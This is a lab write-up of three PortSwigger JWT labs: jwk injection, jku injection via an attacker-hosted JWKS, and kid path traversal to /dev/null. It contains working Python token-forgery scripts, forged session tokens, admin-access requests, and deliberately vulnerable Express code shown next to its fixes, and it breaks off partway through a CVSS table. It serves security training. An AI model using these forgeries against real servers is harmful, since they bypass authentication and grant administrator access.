# Article 3: Injecting Self-Signed JWTs via Header Parameter Injection

> This is **Article 3 of 4** in a series of articles about JWT vulnerabilities, based on labs from [PortSwigger Web Security Academy](https://portswigger.net/web-security/jwt).

**Labs covered:**
- Lab 4: JWT authentication bypass via jwk header injection
- Lab 5: JWT authentication bypass via jku header injection
- Lab 6: JWT authentication bypass via kid header path traversal

---

## About this article

In the previous articles we looked at servers that fail to verify signatures or use weak secrets. This time, the signature verification works — but the server **trusts attacker-controlled key parameters** in the JWT header to decide which key to use. That trust is the flaw.

---

## 1. JWT Header Parameter Injection

According to the JWS specification, only the `alg` header parameter is mandatory. In practice, however, JWT headers (also known as **JOSE headers**) often contain several other parameters. The following ones are of particular interest to attackers:

| Parameter | Description |
|---|---|
| **`jwk`** (JSON Web Key) | Provides an embedded JSON object representing the key |
| **`jku`** (JSON Web Key Set URL) | Provides a URL from which servers can fetch a set of keys containing the correct key |
| **`kid`** (Key ID) | Provides an ID that servers use to identify the correct key when there are multiple keys |

As you can see, these **user-controllable** parameters each tell the recipient server **which key to use** when verifying the signature. If the server does not validate where the key comes from, an attacker can inject a token signed with their **own** arbitrary key instead of the server's secret.

---

## 2. Lab 4: JWT authentication bypass via jwk header injection

### 2.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. The server supports the `jwk` parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it **fails to check whether the provided key came from a trusted source**.
>
> **Goal:** Modify and sign a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`

### 2.2 Theory: How the `jwk` attack works

The JWS specification describes an optional `jwk` header parameter, which servers can use to embed their public key directly within the token in **JWK format**:

```json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

Ideally, servers should only use a limited whitelist of public keys. However, **misconfigured servers sometimes use any key embedded in the `jwk` parameter**.

**Attack flow:**
1. The attacker generates their **own RSA key pair** (private + public).
2. They place their **public key** into the `jwk` header.
3. They sign the token with their **private key**.
4. The vulnerable server sees `header.jwk`, takes the attacker's key, and uses it for `verify()`.
5. Since the signature (private) and the key (public from `jwk`) are a matching pair — the token is valid.
6. Payload like `sub: administrator` is accepted as legitimate.

> When performing this manually, you may also need to update the `kid` header parameter to match the `kid` of the embedded key.

### 2.3 Exploitation Walkthrough

#### Step 1 — Obtain a valid session token

Log in with `wiener:peter` and capture the JWT session cookie.

```http
GET /my-account?id=wiener HTTP/1.1
Host: 0a1a002d0429a2f980adad28008700b8.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0a1a002d0429a2f980adad28008700b8.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiIyNzg0OGEwNS1kOTg0LTRkM2QtOGY1Ny1mYmM4NzIzY2EwNDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODYyMDczMSwic3ViIjoid2llbmVyIn0.stc8stqlJYhdgpat9jwUYKyytUG0RdJk614p-hdsCPqObsNk8HPbe8WTzISSnEZggI_SWF9xlGCLFgUKIjmo7qddqUYAFX_pN6K271vhhOwVwDELgIfNfyrXR5Ub-11ATKL5SZSZZIXQYZmCPZREEA49jGavLyTKIxOb8owpE_Dodyrov-6wthwzNrrgFguWnj1ef-qnrdY8dC1C-j7NSXzvjH_X7D9hUuPCuTdkDIPU8dhdskHcCwWfQSzTh5fAN_rNc6AiPJ4EALLq3dSvSx1C3gDqHbNHZfTqlxTsGSNnEQ0WUvUEz4ZBgJFx2M5KUzjgAkA5F3xzg7veVZp4Zg


```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3451
```

The captured token:

```
eyJraWQiOiIyNzg0OGEwNS1kOTg0LTRkM2QtOGY1Ny1mYmM4NzIzY2EwNDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODYyMDczMSwic3ViIjoid2llbmVyIn0.stc8stqlJYhdgpat9jwUYKyytUG0RdJk614p-hdsCPqObsNk8HPbe8WTzISSnEZggI_SWF9xlGCLFgUKIjmo7qddqUYAFX_pN6K271vhhOwVwDELgIfNfyrXR5Ub-11ATKL5SZSZZIXQYZmCPZREEA49jGavLyTKIxOb8owpE_Dodyrov-6wthwzNrrgFguWnj1ef-qnrdY8dC1C-j7NSXzvjH_X7D9hUuPCuTdkDIPU8dhdskHcCwWfQSzTh5fAN_rNc6AiPJ4EALLq3dSvSx1C3gDqHbNHZfTqlxTsGSNnEQ0WUvUEz4ZBgJFx2M5KUzjgAkA5F3xzg7veVZp4Zg
```

![[Articles/JWT Articles/Article 3/lab 4/Screenshot_20260905_102627.png]]

#### Step 2 — Generate an RSA key pair

```sh
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
```

#### Step 3 — Forge a token with our public key in `jwk`

Create a Python script (requires `PyJWT` and `cryptography`):

```python
import jwt
import base64
from cryptography.hazmat.primitives import serialization

PRIV_PEM = """-----BEGIN PRIVATE KEY-----
...your private key...
-----END PRIVATE KEY-----"""

PUB_PEM = """-----BEGIN PUBLIC KEY-----
...your public key...
-----END PUBLIC KEY-----"""

priv_key = serialization.load_pem_private_key(PRIV_PEM.encode(), password=None)
pub_key  = serialization.load_pem_public_key(PUB_PEM.encode())

numbers = pub_key.public_numbers()

def b64url(n):
    raw = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "n": b64url(numbers.n),  # modulus — the large number behind RSA
        "e": b64url(numbers.e),  # exponent — usually 65537 ("AQAB")
    }
}

payload = {
    "iss": "portswigger",
    "exp": 1788620731,
    "sub": "administrator"
}

token = jwt.encode(payload, priv_key, algorithm="RS256", headers=header)
print(token)
```

> **Note:** `n` and `e` are the two parts of the RSA **public key**. `n` is the modulus (product of two large primes `p × q`), and `e` is the public exponent (usually 65537). Together they fully describe the public key, and from them the key can be reconstructed into X.509 PEM form.

#### Step 4 — Request `/admin` with the forged token


```http
GET /admin HTTP/1.1
Host: 0a1a002d0429a2f980adad28008700b8.web-security-academy.net
Cookie: session=eyJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImt0eSI6IlJTQSIsIm4iOiJtSzh1TldOQk14dUk1LVVqZ2M2TWFQaWdKM1VkYUZKUUNKbnVVQ0NlT0gxdklidV9WM2c3bXRoYUM5OUVrMnZpNlplWEJhMUNLamlYdHBoRWh2YkdLbzRxRElhVkJ6S010SElUbVRrV2NFTXlRU2VpeGZHb3dFTm5PNEFUNkp6T0QtanZLU1ZMSWRUaVBmQmw0YUNiUHc4ZjVtVHdQd2Q5ZTdoQmw2REZOYW9nWDM0Zl9lNGNKWkV4X0pmdUd2LWZLMWJWUE92empUaURCb21lcTJ0Mll2Zl8wZ3F2YzlYaTZjdndfSEZvbjZybERJVEhFRVNtdTBZYzhCajllLUU4aUEteFhfb3Zac3NoM2NVQlpQbnZZaVhacWI0RDRHdzVXNmRXNXVnWWY4R0RZelVBcmxCWUc3R0lnbjEtUzhUTmN5UWZKV1FlLUdaQ3Q2NGVRUlE1WncifSwidHlwIjoiSldUIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODYyMDczMSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.fjJEoacN8GovEI6CWKKTFtcRYw_oM8Xsdxx0wuWnjZMlN9sBrk_6nA7oMWoTcjo_gUzSFuSoNQzBc5n5zcH0VTkzUWiURdCkdFdurURuXEVHExoMBkjVpUwR1jPpW-M7NtPLCJyKcPb2_P047_vzDmecEvGLoYKoJRxnwk6bqO8w5M-Weq5TDucOB8Qoiymd847W9fbVUzn-X9c1OEcFZvwpbusryK0N4z151VmGzDST8k1XPRkiGAmsQMwmtupD5BMosJ64WipFoyjbpRRF3V3MjpC7NyKXN0Df6r-e2p8Uo95XSi2O_AhKv2-Re6tyfH3Hu8wto-BDqrtjSBp0RQ
```

**Response — 200 OK, admin access granted:**

```http
HTTP/1.1 200 OK
Content-Length: 3242
```

![[Articles/JWT Articles/Article 3/lab 4/Screenshot_20260905_103047.png]]
#### Step 5 — Delete the user `carlos`

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a1a002d0429a2f980adad28008700b8.web-security-academy.net
Cookie: session=<forged_token>
```

**Response — 302 → 200, lab solved.**

![[Articles/JWT Articles/Article 3/lab 4/Screenshot_20260905_103242.png]]

### 2.4 Vulnerable Node.js Express Code

```js
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

const SERVER_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
...server public key...
-----END PUBLIC KEY-----`;

app.use('/api', (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    // BUG: the verification key is taken from the TOKEN ITSELF (jwk),
    // not from a trusted source (config / key store).
    const header = jwt.decode(token, { complete: true }).header;

    let verificationKey;
    if (header.jwk) {
      verificationKey = header.jwk;   // attacker controls the key!
    } else {
      verificationKey = SERVER_PUBLIC_KEY;
    }

    const decoded = jwt.verify(token, verificationKey, { algorithms: ['RS256'] });
    req.user = decoded;
    next();
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

**Why it's vulnerable:** the server uses the key provided by the attacker inside `jwk` instead of a trusted key from its own configuration.

### 2.5 Fix

```js
app.use('/api', (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    // Key is taken ONLY from a trusted source
    const decoded = jwt.verify(token, SERVER_PUBLIC_KEY, {
      algorithms: ['RS256'],
      issuer: 'portswigger',
      audience: 'web-security-academy.net'
    });
    req.user = decoded;
    next();
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

---

## 3. Lab 5: JWT authentication bypass via jku header injection

### 3.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. The server supports the `jku` parameter in the JWT header. However, it **fails to check whether the provided URL belongs to a trusted domain** before fetching the key.
>
> **Goal:** Forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`

### 3.2 Theory: How the `jku` attack works

Instead of embedding the key directly via `jwk`, some servers let you use the **`jku` (JWK Set URL)** header parameter to reference a **JWK Set** containing the key. When verifying the signature, the server fetches the relevant key from this URL.

A JWK Set is a JSON object containing an array of JWKs representing different keys:

```json
{
  "keys": [
    { "kty": "RSA", "e": "AQAB", "kid": "75d0ef47-...", "n": "o-yy1wpYmffg..." },
    { "kty": "RSA", "e": "AQAB", "kid": "d8fDFo-...", "n": "fc3f-yy1wpYmffg..." }
  ]
}
```

JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.

**Attack flow:**
1. Attacker generates their own RSA key pair.
2. They host a `jwks.json` containing their **public key** on a server they control.
3. They set the `jku` header to point to that URL.
4. The vulnerable server fetches the key from the attacker's URL and uses it for verification.
5. The attacker signs the token with their private key → valid.

> More secure websites only fetch keys from **trusted domains**. Sometimes URL parsing discrepancies can bypass such filters (similar to SSRF with whitelist-based filters).

### 3.3 Exploitation Walkthrough

#### Step 1 — Obtain a valid session token

Log in with `wiener:peter` and capture the JWT.

```http
GET /my-account?id=wiener HTTP/1.1
Host: 0abb008c03edad3183556e9e0025003b.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0abb008c03edad3183556e9e0025003b.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiI3N2E2ODJhYS02ODNlLTQyNjAtYmY2ZS03NzBlOTAxZTJkM2IiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODYzMDIwNywic3ViIjoid2llbmVyIn0.NN6nPE717RIb8IhSW-DxjiS1YsAwpdn_QHcnV-jukioVW8tYSvcEFCr3Uyc8PvAXHuPgwFEgLT2jrORkHMooj1INkF0cM82YmiTyCCEX2s8Uy--PdephrTRuXVte-hLpT4aRS3I5VE9Z7w2kkhE-VDzFT5S61cGzs6-F11ImiWRa8snqEmRdWlVqf1tbIVtT7bPrzTdAjAbTcVZWPlrkitC13z71jG5FOufIFfHHtQtJ06h4KoYuQGDWj4PfQpKuP3woNA3Fhm91D5zmaoVbfsBaaJSQ57nYFvo9-zYeMAyO-7kDTKFqsd2Xp8oLx3RtIZkduPG1hSV7O9h-tQGsxg


```

The captured token:

```
eyJraWQiOiI3N2E2ODJhYS02ODNlLTQyNjAtYmY2ZS03NzBlOTAxZTJkM2IiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODYzMDIwNywic3ViIjoid2llbmVyIn0.NN6nPE717RIb8IhSW-DxjiS1YsAwpdn_QHcnV-jukioVW8tYSvcEFCr3Uyc8PvAXHuPgwFEgLT2jrORkHMooj1INkF0cM82YmiTyCCEX2s8Uy--PdephrTRuXVte-hLpT4aRS3I5VE9Z7w2kkhE-VDzFT5S61cGzs6-F11ImiWRa8snqEmRdWlVqf1tbIVtT7bPrzTdAjAbTcVZWPlrkitC13z71jG5FOufIFfHHtQtJ06h4KoYuQGDWj4PfQpKuP3woNA3Fhm91D5zmaoVbfsBaaJSQ57nYFvo9-zYeMAyO-7kDTKFqsd2Xp8oLx3RtIZkduPG1hSV7O9h-tQGsxg
```

![[Articles/JWT Articles/Article 3/lab 5/Screenshot_20260905_124510.png]]

#### Step 2 — Forge a token and host a `jwks.json`

Use the same key-generation script from Lab 4 to sign a token with `sub: administrator`. Then create a `jwks.json` file containing your **public key** and set the `kid` to a value that matches your token header:

```json
{
  "keys": [
    {
      "e": "AQAB",
      "kty": "RSA",
      "kid": "mytoken",
      "n": "mK8uNWNBMxuI5-Ujgc6MaPigJ3UdaFJQCJnuUCCeOH1vIbu_V3g7mthaC99Ek2vi6ZeXBa1CKjiXtphEhvbGKo4qDIaVBzKMtHITmTkWcEMyQSeixfGowENnO4AT6JzOD-jvKSVLIdTiPfBl4aCbPw8f5mTwPwd9e7hBl6DFNaogX34f_e4cJZEx_JfuGv-fK1bVPOvzjTiDBomeq2t2Yvf_0gqvc9Xi6cvw_HFon6rlDITHEESmu0Yc8Bj9e-E8iA-xX_ovZssh3cUBZPnvYiXZqb4D4Gw5W6dW5ugYf8GDYzUArlBYG7GIgn1-S8TNcyQfJWQe-GZCt64eQRQ5Zw"
    }
  ]
}
```

> **Important:** the `kid` in the token header **must match** the `kid` in the `jwks.json`, otherwise the server cannot find the key.

#### Step 3 — Host the JWKS and make it reachable

Start a local HTTP server and expose it publicly (for example, via `localhost.run`):

```sh
python -m http.server 8080
ssh -R 80:localhost:8080 nokey@localhost.run
```

![[Articles/JWT Articles/Article 3/lab 5/Screenshot_20260905_125835.png]]

> **Practical note from the lab:** PortSwigger's lab infrastructure will not reach arbitrary external tunnels (e.g. `localhost.run`). The reliable solution is to host `jwks.json` on the lab's **exploit server** — a server inside PortSwigger's own infrastructure — which the lab can always reach.

![[Articles/JWT Articles/Article 3/lab 5/Screenshot_20260906_162051.png]]

![[Articles/JWT Articles/Article 3/lab 5/Screenshot_20260906_162122.png]]
#### Step 4 — Set `jku` in the token header

The final forged token header:

```json
{
  "alg": "RS256",
  "kid": "mytoken",
  "typ": "JWT",
  "jku": "https://exploit-0a4000a60457253c80ee1c33010c0038.exploit-server.net/jwks.json"
}
```

#### Step 5 — Access `/admin` and delete `carlos`

```http
GET /admin HTTP/1.1
Host: 0a4d0034049f258280861dde00d000da.web-security-academy.net
Cookie: session=eyJhbGciOiJSUzI1NiIsImtpZCI6Im15dG9rZW4iLCJ0eXAiOiJKV1QiLCJqa3UiOiJodHRwczovL2V4cGxvaXQtMGE0MDAwYTYwNDU3MjUzYzgwZWUxYzMzMDEwYzAwMzguZXhwbG9pdC1zZXJ2ZXIubmV0L2p3a3MuanNvbiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODcyNzc1OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.k0BjwobVu9KSr8ei_ecmw1huulFrw97Ac23lT8tVVTLWZk_n_xEMD8HPAmJaVv37B2pdMps4hpJDgHeniA2TbJJrV7563D2xF1NxwcgdjuxiN7wWtw1Qmpl-MHvrpsX4EtssJccOpI0ldxzr3OJqgqwvMegO3FPNdQ-vKaH0A6g39dKIBNKsZGLzVtJpfPjdzlNNgYPmHDZAthJeVvnPXi5hoF2TezuG5k963laBBzYkaqcWCrA8YufOFejTiMyRs5itVjQKzK5YJocOoRIGB6ScUju9beWCOfr0TWJVwwIdT5ZxGK1LqeWyF72ipmBwKZcVn59Fs565BVWGSe1WWA
```

**Response — 302 → admin panel:**

```http
HTTP/1.1 302 Found
Location: /admin
```

![[Articles/JWT Articles/Article 3/lab 5/Screenshot_20260906_162207.png]]

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a4d0034049f258280861dde00d000da.web-security-academy.net
Cookie: session=<forged_token>
```

**Lab solved.**

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a4d0034049f258280861dde00d000da.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0a4d0034049f258280861dde00d000da.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJSUzI1NiIsImtpZCI6Im15dG9rZW4iLCJ0eXAiOiJKV1QiLCJqa3UiOiJodHRwczovL2V4cGxvaXQtMGE0MDAwYTYwNDU3MjUzYzgwZWUxYzMzMDEwYzAwMzguZXhwbG9pdC1zZXJ2ZXIubmV0L2p3a3MuanNvbiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODcyNzc1OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.k0BjwobVu9KSr8ei_ecmw1huulFrw97Ac23lT8tVVTLWZk_n_xEMD8HPAmJaVv37B2pdMps4hpJDgHeniA2TbJJrV7563D2xF1NxwcgdjuxiN7wWtw1Qmpl-MHvrpsX4EtssJccOpI0ldxzr3OJqgqwvMegO3FPNdQ-vKaH0A6g39dKIBNKsZGLzVtJpfPjdzlNNgYPmHDZAthJeVvnPXi5hoF2TezuG5k963laBBzYkaqcWCrA8YufOFejTiMyRs5itVjQKzK5YJocOoRIGB6ScUju9beWCOfr0TWJVwwIdT5ZxGK1LqeWyF72ipmBwKZcVn59Fs565BVWGSe1WWA


```

```http
HTTP/1.1 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0


```

### 3.4 Vulnerable Node.js Express Code

```js
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

app.use('/api', async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    const header = jwt.decode(token, { complete: true }).header;

    // BUG: the jku URL is not validated against a trusted domain.
    const jwks = await fetch(header.jku).then(r => r.json());  //  attacker's URL
    const key = jwks.keys.find(k => k.kid === header.kid);

    const decoded = jwt.verify(token, key, { algorithms: ['RS256'] });
    req.user = decoded;
    next();
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

**Why it's vulnerable:** the server fetches keys from whatever URL the attacker puts in `jku`, without checking the domain.

### 3.5 Fix

```js
const TRUSTED_JWKS_HOSTS = ['web-security-academy.net'];

app.use('/api', async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    const header = jwt.decode(token, { complete: true }).header;

    // Only fetch keys from a strict whitelist of trusted hosts
    const jkuHost = new URL(header.jku).hostname;
    if (!TRUSTED_JWKS_HOSTS.includes(jkuHost)) {
      return res.status(401).json({ error: 'Untrusted jku' });
    }

    const jwks = await fetch(header.jku).then(r => r.json());
    const key = jwks.keys.find(k => k.kid === header.kid);
    const decoded = jwt.verify(token, key, { algorithms: ['RS256'] });
    req.user = decoded;
    next();
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

---

## 4. Lab 6: JWT authentication bypass via kid header path traversal

### 4.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the `kid` parameter in the JWT header to **fetch the relevant key from its filesystem**.
>
> **Goal:** Forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`

### 4.2 Theory: How the `kid` attack works

Servers may use several cryptographic keys. For this reason, the JWT header may contain a **`kid` (Key ID)** parameter, which helps the server identify which key to use when verifying the signature.

Verification keys are often stored as a JWK Set. However, the JWS specification doesn't define a concrete structure for this ID — it's just an **arbitrary string** of the developer's choosing. For example, the `kid` might point to a database entry, or even a **file name**.

If this parameter is also vulnerable to **directory traversal**, an attacker can force the server to use an arbitrary file from its filesystem as the verification key:

```json
{ "kid": "../../path/to/file", "typ": "JWT", "alg": "HS256" }
```

This is especially dangerous if the server also supports JWTs signed using a **symmetric algorithm** (HS256). In this case, an attacker could point `kid` to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.

One of the simplest methods is to use **`/dev/null`** (present on most Linux systems). As it's an empty file, reading it returns an empty string. Therefore, signing the token with an **empty string** will result in a valid signature.

### 4.3 Exploitation Walkthrough

#### Step 1 — Obtain a valid session token

Log in with `wiener:peter` and capture the JWT.


```http
GET /my-account?id=wiener HTTP/1.1
Host: 0aa8006803d6a6bb8081ee89000600c1.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0aa8006803d6a6bb8081ee89000600c1.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJlOGJmNzRkYi1mN2Y3LTRmYTQtOTZjOS0xMzdlMGE3YjlmYTEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODczMTExNywic3ViIjoid2llbmVyIn0.qfSG4tqLkghaDhfM9UfU3Oxj88whQqIjvIGHPEtpqRo


```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3466
```

![[Articles/JWT Articles/Article 3/lab 6/Screenshot_20260906_164715.png]]

The captured token:

```
eyJraWQiOiJlOGJmNzRkYi1mN2Y3LTRmYTQtOTZjOS0xMzdlMGE3YjlmYTEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODczMTExNywic3ViIjoid2llbmVyIn0.qfSG4tqLkghaDhfM9UfU3Oxj88whQqIjvIGHPEtpqRo
```

![[Articles/JWT Articles/Article 3/lab 6/Screenshot_20260927_141315.png]]
#### Step 2 — Forge a token with `kid` path traversal to `/dev/null`

The standard technique is to set `kid` to a path traversal sequence that reaches `/dev/null` (an empty file), then sign the token with an **empty string** secret.

> **Note:** tools like `jwt.io`, `Arsenal`, and PyJWT refuse to sign with an empty key. PyJWT 2.x raises `InvalidKeyError: HMAC key must not be empty`. Therefore, the HMAC signature must be generated manually.

```python
import hmac, hashlib, base64, json

header = {
    "alg": "HS256",
    "kid": "../../../../../../../dev/null",
    "typ": "JWT"
}
payload = {"sub": "administrator"}

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())

# Empty key = b""
sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()

token = f"{h}.{p}.{b64url(sig)}"
print(token)
```

The forged token:

```
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.yFqjc7NxlNoWmfvv6j_OiSa92Bz-8Cvqj-hiNVRGzZ4
```

![[Articles/JWT Articles/Article 3/lab 6/Screenshot_20260906_164800.png]]

#### Step 3 — Request `/admin` with the forged token

```http
GET /admin HTTP/1.1
Host: 0aa8006803d6a6bb8081ee89000600c1.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.yFqjc7NxlNoWmfvv6j_OiSa92Bz-8Cvqj-hiNVRGzZ4
```

**Response — 200 OK, admin access granted:**

```http
HTTP/1.1 200 OK
Content-Length: 3257
```

![[Articles/JWT Articles/Article 3/lab 6/Screenshot_20260906_171033.png]]
#### Step 4 — Delete the user `carlos`

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0aa8006803d6a6bb8081ee89000600c1.web-security-academy.net
Cookie: session=<forged_token>
```

**Response — 302 → 200, lab solved.**

![[Articles/JWT Articles/Article 3/lab 6/Screenshot_20260906_171236.png]]

### 4.4 Vulnerable Node.js Express Code

```js
const fs = require('fs');
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

app.get('/admin', (req, res) => {
  const token = req.cookies.session;
  const header = jwt.decode(token, { complete: true }).header;

  // BUG: kid is concatenated into a file path without validation.
  // "../../../../../../../dev/null" → server reads /dev/null as the key.
  const keyPath = '/keys/' + header.kid + '.pem';
  const key = fs.readFileSync(keyPath, 'utf8');   // path traversal

  const decoded = jwt.verify(token, key, { algorithms: ['HS256'] });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

**Why it's vulnerable:** the `kid` value is inserted into a filesystem path without validation, allowing directory traversal. The content of the target file is used as the verification key.

### 4.5 Fix

```js
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

const KEYS_DIR = '/keys';

app.get('/admin', (req, res) => {
  const token = req.cookies.session;
  const header = jwt.decode(token, { complete: true }).header;

  // Validate kid: only allow known IDs, resolve real path, prevent traversal
  const keyPath = path.resolve(KEYS_DIR, header.kid);
  if (!keyPath.startsWith(KEYS_DIR)) {
    return res.status(401).send('Invalid kid');
  }

  const key = fs.readFileSync(keyPath, 'utf8');
  const decoded = jwt.verify(token, key, { algorithms: ['HS256'] });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

---

## 5. CVSS Score

All three vulnerabilities are **authentication bypasses** allowing privilege escalation to an administrator account.

### CVSS v3.1 Vector

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

| Metric | Value | Explanation |
|---|---|---|
| **AV** | Network (N) | Exploited remotely over HTTP |
